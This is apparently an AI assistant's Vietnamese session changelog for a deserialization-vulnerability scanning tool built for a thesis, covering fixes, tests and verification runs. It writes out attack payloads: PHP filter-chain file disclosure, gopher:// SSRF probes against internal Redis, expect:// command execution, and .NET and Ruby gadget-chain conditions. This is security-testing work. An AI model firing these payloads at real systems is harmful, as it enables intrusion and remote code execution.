  5. `replay_request.py` — thêm `_reapply_encoding_chain()`: áp lại từng op theo thứ tự NGƯỢC (`reversed(chain)`, trong→ngoài) để bọc lại ĐÚNG như payload gốc, trước khi gửi. **Chỉ áp dụng khi TOÀN BỘ chain nằm trong `REWRAPPABLE_OPS = {"url","base64","base64_gzip","hex"}`** — `jwt_segment`/`json_claim` là EXTRACTION CẤU TRÚC (lấy 1 string ra khỏi cây JSON/JWT lớn hơn), không phải transform tuyến tính nên KHÔNG re-wrap được bằng cách này — cố ý bỏ qua (giữ hành vi cũ: gửi giá trị trần) chứ không áp sai, tránh gửi sai còn nguy hiểm hơn không gửi.

  **Verify thật** (không chỉ unit test):
  - Giả lập chain `["base64_gzip"]` (đúng ví dụ user nêu): PHP gadget → mutate boolean → re-wrap → decode lại bằng `gzip.decompress(base64.b64decode(...))` → **khớp CHÍNH XÁC** giá trị đã mutate.
  - Giả lập byte Java serialization nhị phân → qua `_select_payload_value()` → encode lại bằng latin-1 → **khớp CHÍNH XÁC** byte gốc (trước đó UTF-8 sẽ làm sai khác 8 byte).
  - Chạy thật `result1.json` (data THẬT, 11 vector PortSwigger): `encoding_chain: ['url', 'base64']` xuất hiện đúng trên mutation thật — xác nhận cookie thật của lab này VỐN được URL-encode bọc ngoài base64, đúng loại case bug B nhắm tới.
  - Full suite: 64/64 unit test pass (3 test cũ của `test_normalize.py` phải sửa assertion cho khớp return type mới — không đổi hành vi, chỉ đổi cách đọc tuple), mypy sạch cả 8 file chuẩn của project, `analyze` trên `result1.json` vẫn đúng 11/11, 0 traceback.
  - **Chạy lại toàn bộ `comprehensive.har` (158 entry) sau fix** — theo yêu cầu "chạy test comprehensive chưa": `scan`+`analyze` exit=0, 0 traceback, số liệu khớp CHÍNH XÁC baseline trước fix (154 vector sau filter, `exploitable=57`, tổng mutation=125, 30 lỗi thiếu tool) — xác nhận 2 fix này chỉ THÊM metadata/sửa cách encode lúc gửi, không đổi logic phát hiện/sinh mutation nào. 95/125 mutation (loại trừ 30 lỗi) có đúng field `encoding_chain`, ví dụ thật `['base64']` xuất hiện trên các candidate vốn bị base64-wrap trong `comprehensive.har`.

-16. **[VERIFY CUỐI — end-to-end + unit test]** Theo yêu cầu "chạy test end-to end, unit test đợt cuối đi" trước khi đóng phiên. Kết quả:

  **Unit test**: `python -m unittest discover -s TestCase -p "test_*.py" -v` → **64/64 pass**, 0 fail/error.

  **E2E trên `result1.json` (data THẬT, 11 vector PortSwigger)** — full pipeline `scan`(đã có sẵn)→`analyze`→`assess`→`report`:
  - `analyze`: exit=0, 0 traceback, 11/11 `exploit_type` sinh đúng.
  - `assess`: exit=0, 0 traceback (chạy lâu — replay thật tới lab PortSwigger đã hết hạn, mỗi request treo chờ timeout kết nối nên bị đẩy sang background, không phải lỗi).
  - `report`: exit=0, 0 traceback, **Confirmed: 0 | Suspected: 11** — đúng kỳ vọng đã ghi nhận trước đó (lab hết hạn nên không Confirm được, không phải regression).

  **E2E trên `TestCase/comprehensive.har` (synthetic, 158 vector)** — full pipeline `scan`→`analyze`:
  - `scan --har`: exit=0, trích 10316 vector thô từ 669 HTTP entry.
  - `analyze`: exit=0, 0 traceback, **154 vector sau filter** → 158 entry kết quả (1 vector có thể sinh nhiều candidate sau `normalize()`).
  - **`exploitable=True`: 57** — khớp CHÍNH XÁC baseline cuối cùng đã ghi ở mục 0 ("tổng exploitable giữ nguyên 57") — xác nhận KHÔNG regression qua toàn bộ các fix của phiên này (mục -8 đến -15).
  - **Tổng mutation: 125** (30/125 là dict `{"error":...}` do môi trường shell này chạy Windows thuần, không qua WSL2 — `java`/`php`/`ruby` không có trên PATH, chỉ `ysonet.exe` chạy được native — đúng thiết kế fallback, không phải bug).

  **Kết luận**: toàn bộ pipeline ổn định, không có lỗi phát sinh từ các thay đổi trong phiên này. Giai đoạn review/fix `payloadMutation.py` (mục -15) chính thức đóng với bằng chứng verify đầy đủ.

-15. **[CHỐT GIAI ĐOẠN — review/fix `payloadMutation.py` offline]** User xác nhận "bước này coi như ok được chưa? Mốt mình làm web để test thì mới tiếp tục fix tiếp được" — đồng ý đóng giai đoạn review/sửa lỗi THUẦN ĐỌC CODE (không cần target thật) cho `payloadMutation.py`. Tóm tắt những gì đã làm trong phiên này (đọc mục -9 tới -14 bên dưới để biết chi tiết từng fix):
  - `_mutate_dotnet_jsonnet()` — thêm điều kiện .NET Framework/GAC vào note (mục -8).
  - `main.py` — cảnh báo platform non-Windows cho `.NET` detection (mục -9).
  - `_mutate_wrapper_ssrf()` canary — thêm `Host:` header + dòng trống kết thúc (mục -11).
  - 5 chỗ `except (TimeoutExpired, FileNotFoundError)` quá hẹp → broaden `(SubprocessError, OSError, UnicodeDecodeError)` (mục -12).
  - Redis fallback host — sinh cả `127.0.0.1` lẫn host target thay vì chỉ host target (mục -13).
  - 4 fix từ review paste vào: `_mutate_wrapper_stream()` chain order, `_mutate_wrapper_traversal()` note, `_extract_host()` dùng `urlparse`, `_mutate_wrapper_lfi()` tham số hoá resource (mục -14).

  **Verify cuối giai đoạn**: 64/64 unit test pass, mypy sạch — xác nhận lại 1 lần nữa trước khi đóng.

  **Việc CÒN LẠI, chỉ làm tiếp được khi có môi trường web test thật** (đã note từ mục -7/-6 phía dưới, nhắc lại cho rõ vì đây là lý do chính khiến giai đoạn này dừng ở đây):
  1. Ruby real gadget chain (Universal Deserialization Gadget Chain) — cần host file `.rz` + Bundler cache path cụ thể theo target.
  2. YAML Java full RCE — cần host file `.jar` độc qua `ServiceLoader`.
  3. Hiệu quả thật của SSRF Redis fallback (mục -13) — chỉ verify được bằng cách thử trên Redis thật, không verify được qua unit test tĩnh.
  4. Toàn bộ Stage 8 (`assess`/replay) — chưa có target sống nào để confirm thật ngoài `result1.json` (lab PortSwigger đã hết hạn).

  **Bước tiếp theo khi quay lại**: dựng môi trường web giả lập/vulnerable test (Docker Compose có app PHP/Java/.NET dính lỗi deserialization thật) — đã note ý định từ trước, giờ là điều kiện tiên quyết để tiếp tục, không phải việc độc lập nữa.

-14. **[FIXED — theo review user paste vào, đã tự verify từng điểm trước khi sửa]** 4 fix cho nhóm `_mutate_wrapper_*`/`_extract_host()`, đúng thứ tự ưu tiên review đề xuất (Cao→Trung→Thấp). Đã tự verify TỪNG claim của review trước khi tin (WebSearch + chạy tay), không sửa mù theo review dán vào:

  1. **[Cao]** `_mutate_wrapper_stream()` ([payloadMutation.py:1019-1031](Analyze/payloadMutation.py#L1019-L1031)) — chain cũ `compress.zlib://php://filter/convert.base64-encode/resource=index.php` SAI THỨ TỰ: `compress.zlib://` mong đợi byte zlib nén thật phía sau, nhưng `php://filter/convert.base64-encode/...` trả ra TEXT base64 → giải nén sẽ fail, gần như chắc chắn không chạy được. Verify qua php.net: cú pháp CHUẨN để stack nhiều filter là dùng dấu `|` NGAY TRONG 1 `php://filter/` wrapper (`zlib.deflate|convert.base64-encode`), không phải lồng 2 scheme khác nhau. Fix: đổi `raw` thành `"php://filter/convert.base64-encode|zlib.deflate/resource=index.php"`, sửa `note` giải thích đúng cơ chế + lý do bản cũ không chạy.

  2. **[Trung]** `_mutate_wrapper_traversal()` (dòng 1011-1021) — `glob://` chỉ implement method directory-listing (`dir_opendir`/`dir_readdir`), KHÔNG implement `stream_open` → dùng với `include()`/`file_get_contents()`/`fopen()` sẽ không trả gì cả, chỉ dùng được với `opendir()`/`readdir()`/`scandir()`/`DirectoryIterator`. Verify qua php.net chính thức (`wrappers.glob.php`: "does not allow reading, writing, appending"). Fix: viết lại `note` nói rõ điều kiện này, tránh người dùng tưởng nó generic như LFI thường.

  3. **[Trung]** `_extract_host()` (dòng 1028-1031) — regex `r"://([^/:]+)"` vỡ với URL có `user:pass@host` (trả về `"user"` thay vì host thật) và IPv6 `[::1]` (trả về `"["`). Verify bằng chạy tay thật (không chỉ đọc): `http://user:pass@example.com:8080/path` → regex ra `'user'` (SAI), `urlparse(...).hostname` ra `'example.com'` (ĐÚNG); `http://[::1]:6379/path` → regex ra `'['` (SAI), `urlparse` ra `'::1'` (ĐÚNG). Fix: đổi hẳn sang `urlparse(url).hostname or "TARGET_HOST"`, thêm `from urllib.parse import urlparse` vào import đầu file.

  4. **[Thấp]** `_mutate_wrapper_lfi()` (dòng 997-1013) — `resource=index.php` hardcode, không phủ được case target dùng tên file khác. Fix: thêm `SOURCE_DISCLOSURE_FILES = ["index.php", "config.php", "wp-config.php", ".env"]`, loop sinh 4 biến thể thay vì 1 — không đổi 2 entry `file://` (Unix/Windows) đã đúng từ trước.

  **Không sửa** (review tự caveat đã đủ, không phải bug đang xảy ra): quote injection trong `system('{cmd}')` của `php_input`/`data` — kiểm tra `TEST_COMMANDS = ["id", "whoami", "hostname"]` ([payloadMutation.py:16](Analyze/payloadMutation.py#L16)) không có quote nào, rủi ro chỉ lý thuyết với whitelist hiện tại.

  **Verify**: chạy tay `PayloadMutation(...).mutate()` cho cả 4 probe (`lfi`/`traversal`/`stream`/`ssrf` qua URL có userinfo+port) — ra đúng kỳ vọng từng cái (liệt kê đủ trong log chạy tay). 64/64 unit test pass, mypy sạch.

  **Nguồn**: [PHP: glob:// - Manual](https://www.php.net/manual/en/wrappers.glob.php), [PHP filters chain — Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it), [LFI2RCE via PHP Filters — HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters).

-13. **[FIXED — bug logic thật, user tự tìm ra]** `_mutate_wrapper_ssrf()` fallback thủ công (không có Gopherus) dùng `host = self._extract_host()` ([payloadMutation.py:1022-1025](Analyze/payloadMutation.py#L1022-L1025)) — hàm này lấy **host CÔNG KHAI của target** (regex trên chính `self.vector["url"]`), nhưng Redis hầu như luôn bind `127.0.0.1` nhìn từ GÓC ĐỘ CHÍNH SERVER đang chạy — SSRF khai thác được chính vì server tự nối `localhost:6379`/IP nội bộ, thứ attacker bên ngoài KHÔNG với tới trực tiếp được. Payload cũ `gopher://{public_host}:6379/_INFO` gần như không bao giờ chạm được Redis thật (Redis bind public cùng host với web app là cực hiếm).

  **Fix** ([payloadMutation.py:956-969](Analyze/payloadMutation.py#L956-L969)): đổi thành sinh **CẢ 2 biến thể** thay vì 1 — `127.0.0.1` (mặc định chính, case phổ biến nhất: Redis cùng máy với web app) VÀ host từ `_extract_host()` (dự phòng, phòng case hiếm URL scan vốn đã là host nội bộ) — dùng `dict.fromkeys()` để dedup nếu 2 giá trị trùng nhau. Cập nhật `chain` field thành `f"manual/redis-info-probe/{h}"` để phân biệt 2 mutation, note giải thích rõ lý do ưu tiên `127.0.0.1`.

  **Verify thật** (không chỉ đọc code): chạy tay `PayloadMutation(...).mutate()` với `url="http://example.com/upload"` → ra đúng 2 payload `gopher://127.0.0.1:6379/_INFO%0D%0A` và `gopher://example.com:6379/_INFO%0D%0A`. 64/64 unit test pass (không test nào cover hàm này trước đó — đã grep xác nhận), mypy sạch.

-12. **[FIXED — bug thật, user tự tìm ra bằng cách đọc code]** `except (subprocess.TimeoutExpired, FileNotFoundError)` quá hẹp ở nhiều hàm gọi tool ngoài — bỏ sót 2 loại lỗi thật có thể crash uncaught: (1) `subprocess.SubprocessError` nói chung (chỉ bắt đúng `TimeoutExpired`, bỏ sót các lỗi con khác của cùng họ); (2) `UnicodeDecodeError` — mọi `subprocess.run(..., text=True, ...)` tự động decode stdout/stderr bằng encoding mặc định, nếu tool ngoài (VD Gopherus — script Python 2 cũ) in ra byte không phải UTF-8 hợp lệ, decode crash NGAY TRONG `subprocess.run()`, raise TRƯỚC KHI kịp vào nhánh `except` hẹp hiện tại → lỗi lọt ra ngoài `mutate()`, có thể làm sập cả `analyze` (main.py không có try/except quanh `PayloadMutation(...).mutate()`).

  **User tự phát hiện** ở `_mutate_wrapper_ssrf()` ([payloadMutation.py:953](Analyze/payloadMutation.py#L953) cũ, gọi Gopherus) — đọc code tự nhận ra `FileNotFoundError` gần như thừa (đã bị chặn trước bởi `os.path.exists(self.GOPHERUS_PATH)` + `_find_python2()`, trừ race condition), còn thiếu đúng 2 loại lỗi nêu trên.

  **Rà soát toàn file tìm đủ các chỗ cùng bug class** (không chỉ sửa đúng 1 chỗ được chỉ ra) — tổng cộng 5 vị trí, broaden hết về `(subprocess.SubprocessError, OSError, UnicodeDecodeError)`:
  1. `_mutate_wrapper_ssrf()` Gopherus call — dòng 953 (chỗ user chỉ ra).
  2. `_mutate_ruby()` — dòng 714 — y hệt pattern Gopherus (`text=True` + except hẹp), message lỗi cũng sửa lại cho đúng ("ruby not found, timed out, or produced undecodable output" thay vì chỉ "not found or timed out").
  3. `_run_phpggc()` — dòng 416 — đã broaden `OSError` family từ trước (phiên trước), nhưng vẫn thiếu đúng `UnicodeDecodeError` (có `.decode()` ở dòng 411 bên trong try) và `SubprocessError` chung.
  4. `_run_ysonet()` — dòng 776 — cùng tình trạng như `_run_phpggc()` (đã broaden 1 phần trước đó, vẫn thiếu decode).
  5. `_mutate_wrapper_phar()` inline phpggc call — dòng 887 — không dùng `text=True` (bytes mode, không có nguy cơ decode) nhưng vẫn thiếu `PermissionError`/`OSError` chung — broaden cho đồng nhất với 4 chỗ còn lại, dù rủi ro thấp hơn.

  **Verify**: 64/64 unit test pass, `mypy` sạch (`payloadMutation.py`, 0 lỗi) — chỉ mở rộng except tuple, không đổi logic nào.

-11. **[FIXED]** `payloadMutation.py:_mutate_wrapper_ssrf()` canary OOB payload (dòng 927 cũ) — theo đề xuất user "raw = f"gopher://{oob_domain}:80/_GET /oob-ssrf-check HTTP/1.1%0D%0AHost: {oob_domain}%0D%0A%0D%0A" như vậy được không". Bản cũ thiếu 2 thứ: (1) không có header `Host:` (HTTP/1.1 bắt buộc, nhiều service log tương tác như Burp Collaborator/interactsh định tuyến/parse theo Host); (2) không có dòng trống kết thúc header (`%0D%0A%0D%0A`) — thiếu dòng này, HTTP server đúng chuẩn sẽ chờ thêm dữ liệu (chưa biết header đã hết chưa), có thể không log/xử lý request ngay.

  **Fix** ([payloadMutation.py:927-930](Analyze/payloadMutation.py#L927-L930)): đổi `raw` thành đúng bản user đề xuất, thêm `Host:` header + dòng trống kết thúc. Để space trong "GET /path HTTP/1.1"/"Host: ..." KHÔNG encode (`%20`) — xác nhận vẫn đúng vì `Replay/replay_request.py:92` (`urllib.parse.urlencode()`) tự encode lúc gửi thật ở Stage 8, không cần tự tay escape trước ở Stage 7.

  **Phát hiện phụ, tự sửa lại giải thích SAI trước đó của chính tôi**: lúc giải thích "wrapper" (phiên trước), tôi gộp nhầm `gopher://` chung nhóm "PHP stream wrapper" (`stream_wrapper_register()`) với `php://`/`phar://`/`expect://`. Đã WebSearch xác nhận: gopher SSRF thực chất chạy qua **cURL** (`curl Gopher protocol handler`, code dính lỗi thường là `curl_setopt($ch, CURLOPT_URL, $userInput)` + `curl_exec()`), KHÔNG PHẢI qua `stream_wrapper_register()` như 7 cái còn lại — khác cơ chế, dù cùng nằm chung dispatcher `_mutate_wrapper()` trong code (gộp theo tiện lợi tổ chức code, không phải cùng bản chất kỹ thuật). Đây cũng là lý do kỹ thuật "double URL-encode %0D%0A" là chuẩn cộng đồng khi gopher đi qua tham số HTTP (2 lớp decode: framework parse `$_GET` 1 lần + cURL tự decode selector gopher 1 lần nữa) — khớp đúng cách `urlencode()` ở Stage 8 hoạt động.

  **Verify**: 64/64 unit test pass (không test nào assert chuỗi payload cũ, grep xác nhận trước khi sửa).

  **Nguồn**: [curl Gopher Protocol Command Injection — HackerOne](https://hackerone.com/reports/3508785), [How Gopher works in escalating SSRFs](https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630).

-10. **[GHI CHÚ — không phải code fix]** Tự sửa lại giải thích của chính mình về cơ chế `expect://` ([payloadMutation.py:856-865](Analyze/payloadMutation.py#L856-L865), hàm `_mutate_wrapper_expect()`) — ban đầu giải thích sai là "1 hàm kiểu `popen()`", user tự search và phát hiện đúng hơn: PHP extension `expect` dùng **PTY** (pseudo-terminal thật, qua `expect_popen()`), KHÔNG PHẢI pipe thường như `popen()` chuẩn libc. Đã WebSearch xác nhận qua doc chính thức PHP (`expect_popen()` — "opens the PTY stream to the process's stdio").

  **Vì sao khác biệt quan trọng**: Expect sinh ra để tự động hoá chương trình TƯƠNG TÁC (`ssh`/`passwd`/`telnet`) — các chương trình này tự kiểm tra `isatty()` và đổi hành vi (VD `passwd` từ chối chạy nếu không có terminal thật, `ssh` tắt echo khi nhập password) — pipe thường (`popen()`) sẽ làm `isatty()` trả `false`, khiến các chương trình này không chạy đúng/từ chối thẳng. PTY bắt buộc về kỹ thuật, không phải chi tiết implementation tuỳ chọn.

  **Kết luận bảo mật của payload KHÔNG đổi**: dù cơ chế plumbing khác (PTY thay vì pipe), chuỗi sau `expect://` vẫn được `expect_popen()` đưa cho shell chạy (RCE đầy đủ) — chỉ sửa lại MÔ TẢ cơ chế bên dưới cho đúng, không phát hiện bug code nào, không có thay đổi logic.

  **Nguồn**: [PHP: expect_popen - Manual](https://www.php.net/manual/en/function.expect-popen.php), [doc-en/reference/expect/functions/expect-popen.xml](https://github.com/php/doc-en/blob/master/reference/expect/functions/expect-popen.xml).

-9. **[MỚI]** `main.py` — thêm cảnh báo runtime khi chạy `analyze` trên nền tảng không phải Windows (Docker/Linux/macOS), theo yêu cầu "ghi lên thông báo lúc người sử dụng tool là tool có thể giảm độ trust ở 1 số case khi chạy trên linux". Bối cảnh dẫn tới yêu cầu này: giảng viên chấm luận văn phần lớn dùng Mac → không dùng được `ethicalquoc.ps1`/`setup.ps1` (dựa trên `wsl.exe`, chỉ có trên Windows) → bắt buộc chạy qua Docker → Docker/mono không chạy được `.NET`/`ysonet` (đã verify ở mục -3/-4, lỗi thật: `PresentationFramework` thiếu cho `ObjectDataProvider`, `Object reference not set` cho `TypeConfuseDelegate`, `Collection is read-only` cho `ActivitySurrogateSelector`) → nếu không cảnh báo rõ, người dùng trên Mac dễ hiểu lầm "không có finding `.NET`" nghĩa là "target an toàn", trong khi thực chất là "tool không kiểm tra được trên nền tảng này".

  **Fix** ([main.py:1-4](main.py#L1-L4) thêm `import platform`; [main.py:129-138](main.py#L129-L138)): trong nhánh `elif args.command == "analyze"`, ngay sau dòng `print(f"[*] Analyzing: {args.input}")`, kiểm tra `platform.system() != "Windows"` — nếu đúng, in 1 cảnh báo rõ ràng (không phải per-vector, chỉ 1 lần đầu run) nêu rõ: gadget nào không chạy được (`ObjectDataProvider`/`TypeConfuseDelegate`/`ActivitySurrogateSelector`), lý do (mono không triển khai đủ .NET Framework CLR thật), và hệ quả (absence of finding ≠ target safe), kèm hướng dẫn muốn full coverage thì chạy Windows native hoặc WSL2.

  **Verify**: 64/64 unit test pass (không test nào assert output `print`, chỉ thêm thông báo thuần, không đổi logic phân tích/mutation nào).

-8. **[BỔ SUNG]** `payloadMutation.py:_mutate_dotnet_jsonnet()` — note của payload `ObjectDataProvider` (dòng 823-828) trước đây chỉ ghi điều kiện `TypeNameHandling.All/Objects/Auto`, thiếu điều kiện thứ 2 mà user tự research và xác nhận đúng ("target muốn load được thì phải có sẵn PresentationFramework nếu muốn gọi tới type WPF"): đã WebSearch xác nhận thêm — `PresentationFramework.dll` chỉ **tự động có sẵn trong GAC** trên **.NET Framework classic** (`C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\`), KHÔNG có trên **.NET Core/.NET 5+** (không có GAC, WPF chỉ tồn tại qua TFM `netX.0-windows` phải khai báo rõ). Đây là lý do thực tế gadget này khai thác được cả trên ASP.NET web app (Framework) chưa từng dùng WPF — nhưng KHÔNG khai thác được trên ASP.NET Core dù `TypeNameHandling` vẫn bật sai (dễ nhầm là false positive nếu không biết .NET Framework/Core khác nhau ở điểm này). Fix: nối thêm câu "AND target must run classic .NET Framework... Does NOT work against .NET Core/.NET 5+ targets" vào `note`.

  **Nguồn tham khảo**: [HackTricks — Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)](https://hacktricks.wiki/en/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html) — xác nhận trực tiếp "A type available in the Windows GAC, meaning no third-party requirements are required for exploitation"; [BlackHat whitepaper — Friday the 13th: JSON Attacks](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) (Alvaro Muñoz & Oleksandr Mirosh, 2017) — nguồn gốc đặt tên lỗ hổng `TypeNameHandling`.

  **Verify**: 64/64 unit test pass (không có test nào assert đúng chuỗi `note` cụ thể, chỉ đổi text mô tả — không đổi logic sinh payload/mutation nào).

-7. **[ĐỂ DÀNH — không code ngay]** Research cho "Ruby chỉ có payload generic" (mục -5) — theo yêu cầu "có tool nào không, đề xuất" rồi "có [làm], và nhớ note lại nguồn tham khảo". Đã research thật (WebSearch + WebFetch đọc nguyên trang, không đoán), quyết định CHƯA implement — để sau khi dựng xong môi trường test thật (mục -6, ý "mốt tôi cũng phải deploy vài môi trường web giả lập để test").

  **Nguồn tham khảo, ghi rõ tham khảo gì ở từng nguồn**:
  - **[elttam.com/blog/ruby-deserialization](https://www.elttam.com/blog/ruby-deserialization/)** — bài nghiên cứu GỐC (Luke Jahnke) công bố kỹ thuật "Ruby 2.x Universal RCE Deserialization Gadget Chain" — tham khảo Ý TƯỞNG chuỗi gadget đi qua các class có sẵn của RubyGems (`Gem::Requirement`, `Gem::DependencyList`, `Gem::Source::SpecificFile`, `Gem::StubSpecification`...) — không lấy được code đầy đủ qua `WebFetch` (trang chỉ có snippet rời rạc, không phải 1 script hoàn chỉnh).
  - **[devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)** ("Round Two", bản cập nhật 2022, tác giả ghi "currently works on all ruby versions from 2.0 to 3.2rc1") — tham khảo TOÀN BỘ code PoC đầy đủ qua `WebFetch` (đã đọc được nguyên văn): gồm `generate_rz_file()`, `create_folder()`, `git_gadget()`, `popen_gadget()`, `to_s_wrapper()`, ráp lại thành `Marshal.dump([Gem::SpecFetcher, to_s_wrapper(folder_gadget), to_s_wrapper(exec_gadget)])`.
  - **[PentesterLab: Ruby 2.x Universal RCE Deserialization Gadget Chain](https://pentesterlab.com/exercises/ruby_ugadget)** — bài lab thực hành riêng cho đúng kỹ thuật này, tham khảo để biết đây là kỹ thuật đủ nổi tiếng/được công nhận rộng rãi trong ngành (không phải nguồn tự phát ít người biết).
  - **[PayloadsAllTheThings/Ruby.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)** — đã lưu vào memory từ trước ([[reference-payloadsallthethings-deserialization]]) làm nguồn tham khảo chung, có liệt kê payload Ruby nhưng không đi sâu bằng 2 bài trên.

  **Vì sao CHƯA implement ngay — phát hiện quan trọng khi đọc kỹ PoC thật**: chuỗi gadget này KHÔNG PHẢI dạng "1 hàm sinh payload, gửi là chạy" như Java/PHP/Pickle/YAML-Python hiện có. Cơ chế THẬT cần multi-stage:
  1. Tạo + HOST 1 file `.rz` (nén) ở đâu đó target lấy được — cùng bản chất với giới hạn "cần host file `.jar` độc" của YAML Java đã ghi ở mục 6 (Threats to Validity/Known Limitations) — ngoài phạm vi 1 tool sinh payload tự động.
  2. Payload chứa 1 object `URI::HTTP` bị set `@port` thành 1 chuỗi **path traversal cụ thể**, nhắm đúng vào thư mục cache Bundler — vị trí này **phụ thuộc hash tính từ URL git**, tức phụ thuộc version Ruby/Bundler + cấu hình CỤ THỂ của target, không "universal" theo nghĩa dùng ngay được cho mọi target như tên gọi.
  3. Không có bước "OOB blind confirmation" đơn giản như YAML Java (CVE-2022-1471) — không có cách rút gọn thành "chỉ xác nhận, chưa full RCE" mà vẫn hữu ích ngay.

  **Kế hoạch khi quay lại làm**: cần môi trường Rails/Ruby thật để test (không thể verify chuỗi gadget multi-stage này chỉ bằng cách gọi `ruby -e` xem có lỗi cú pháp không — phải thấy hành vi thật trên 1 app có Bundler cache thật) — đúng lý do gộp chung với việc "dựng vài môi trường web giả lập để test" đã note ở mục -6. Khi có môi trường đó, quay lại đọc kỹ lại 2 link trên, implement `_mutate_ruby()` theo cấu trúc PoC thật (không hardcode y nguyên URL/giá trị ví dụ trong bài viết — đó là ví dụ minh hoạ riêng của tác giả, cần tự thay bằng hạ tầng của người dùng tool, giống cách `oob_domain` đã làm cho các payload OOB khác).

-6. **[FIXED]** `payloadMutation.py` giới hạn "chỉ mutate scalar" (mục -5 phía dưới) — field dạng array/object lồng bên trong (VD `profile.role`, không phải `role` ở top-level) bị `__flip_boolean`/`__modify_string`/`_mutate_integer` bỏ qua hoàn toàn, vì `_iter_php_pairs()` cũ coi container (`a:`/`O:`) là "opaque" — chỉ tìm đúng cặp `{`/`}` khớp để biết SPAN, không đọc nội dung bên trong.

  **Fix** ([payloadMutation.py:476-503](Analyze/payloadMutation.py#L476-L503)): thêm tham số `start`/`end`/`depth` cho `_iter_php_pairs()` (giữ nguyên chữ ký cũ nhờ default value, không phải sửa 3 nơi gọi) — khi gặp value kiểu `a:`/`O:`, ĐỆ QUY vào bên trong (tự tìm `{` riêng của container đó qua `payload.find("{", val_tok["start"], val_tok["end"])`, giới hạn `end` đúng theo span đã biết từ `_read_php_token()`) thay vì bỏ qua. Vị trí `start`/`end` của mọi token vẫn là **tuyệt đối trên toàn payload gốc** (không phải trên substring con) — nên logic thay thế theo vị trí (`payload[:start] + new + payload[end:]`) ở 3 hàm mutate không cần đổi gì, chỉ cần `_iter_php_pairs()` trả về đúng token ở tầng sâu hơn. Thêm `depth > 20: return []` làm giới hạn an toàn chống đệ quy vô hạn nếu payload méo (theo đúng pattern đã dùng ở `_extract_claim_strings()` bên `normalize.py`).

  **1 test cũ bị "vô hiệu hoá" tự phát hiện lúc fix**: `test_nested_object_container_is_skipped_not_recursed_into` — tên/docstring khẳng định hành vi CŨ, nhưng vẫn PASS sau khi đổi logic, vì payload test đó (từ lab PortSwigger thật) tình cờ KHÔNG có field nào khớp hint dù ở tầng nào — test không thực sự phân biệt được hành vi cũ/mới. Đã đổi tên thành `test_nested_object_with_no_matching_field_produces_no_mutation` (giữ nguyên nội dung, chỉ sửa tên đúng ý nghĩa) + thêm 3 test MỚI chứng minh field lồng thực sự được mutate cho cả 3 hàm (`test_nested_object_field_is_now_recursed_into_and_mutated`, `test_boolean_field_nested_inside_object_is_now_found_and_flipped`, `test_integer_field_nested_inside_object_is_now_found_and_mutated`).

  **Verify**: 64/64 unit test pass (61 cũ + 3 mới), mypy 0 lỗi. Test tay xác nhận cả 3 hàm đều mutate đúng field lồng (`flip_boolean`: 1 mutation, boolean `admin` trong object con `Profile` bị flip đúng; `modify_integer`: 4 mutation cho field `level` lồng; `modify_string`: 4 mutation cho field `role` lồng). `result1.json` (dữ liệu thật) và `comprehensive.har` (synthetic) — số liệu (11 mutation / 140 mutation) giữ nguyên y hệt trước fix, vì cả 2 nguồn hiện chỉ có payload PHP PHẲNG (không lồng) đi qua 3 hàm mutate scalar này — xác nhận fix chỉ THÊM khả năng, không đổi hành vi cũ.

-5. **[FIXED]** `payloadMutation.py:__modify_string()` — `all_hints` chỉ có tiếng Anh (`username`/`role`/`admin`/...), field tên tiếng Việt (VD `taikhoan`/`vaitro`) không được nhận diện, `modify_string` im lặng không sinh mutation nào cho field đó. Fix ([payloadMutation.py:512-517](Analyze/payloadMutation.py#L512-L517)): thêm 9 từ tiếng Việt không dấu phổ biến — `taikhoan`, `tendangnhap`, `nguoidung`, `dangnhap` (~username/user/login), `vaitro` (~role), `quantri` (~admin), `quyen` (~access/privilege), `capdo` (~level), `truycap` (~access). Verify: payload PHP serialize có 2 field `taikhoan`/`vaitro` (tính đúng length bằng `len()`, không gõ tay — tự phát hiện 2 lần gõ tay sai length trước đó khiến `_iter_php_pairs` chỉ đọc được 1/2 pair, đúng behavior "fail-closed" đã thiết kế, không phải bug) → sinh đúng 8 mutation (4 cho mỗi field). 61/61 unit test vẫn pass, không regression.

  **Việc CÒN LẠI, để triển khai/quyết định sau (theo yêu cầu user — chưa làm ngay)**:
  1. **Deploy môi trường web giả lập để test** — user tự đặt câu hỏi "mốt tôi cũng phải deploy vài môi trường web giả lập để test à" — ĐÚNG, cần thiết thật: hiện tại nguồn dữ liệu thật DUY NHẤT là `result1.json` (11 vector, 1 lab PortSwigger, đã hết hạn — verify lúc chạy `assess` cho ra 0 Confirmed vì target không còn sống). Muốn có số liệu thật đa dạng hơn (Java/`.NET`/Pickle/YAML/NodeJS/Ruby) cho phần "Dữ liệu định lượng" của luận văn (đã note ở mục 3 — Việc học thuật), cần tự dựng lab thật chạy được (VD: Docker Compose có sẵn app PHP/Java dính lỗi deserialization thật, hoặc dùng lại PortSwigger labs còn hoạt động). Đây là việc quy mô LỚN, chưa bắt đầu, chỉ mới ghi nhận ý định.
  2. **YAML Java full RCE** (host file `.jar` độc) — đã giải thích kỹ cơ chế qua hội thoại (SnakeYAML CVE-2022-1471, `ServiceLoader` tự load class từ `URLClassLoader`, static initializer chạy code ngay khi class được load). User đồng ý: OOB blind confirmation hiện tại ĐỦ cho mục đích detection của tool, việc tự động host `.jar` độc là hành động khai thác thật (rủi ro cao hơn hẳn, cần người quyết định thủ công) — **để triển khai sau, không phải bug cần fix ngay**.
  3. **Scalar-only mutation** (field array/object lồng bị bỏ qua hoàn toàn trong `__flip_boolean`/`__modify_string`/`_mutate_integer`) — user nhắc lại, chưa yêu cầu fix, để dành.
  4. **Ruby chỉ có payload generic** (chưa có gadget chain thật cho Rails/framework cụ thể, đã tự document trong code) — user nhắc lại, chưa yêu cầu fix, để dành.

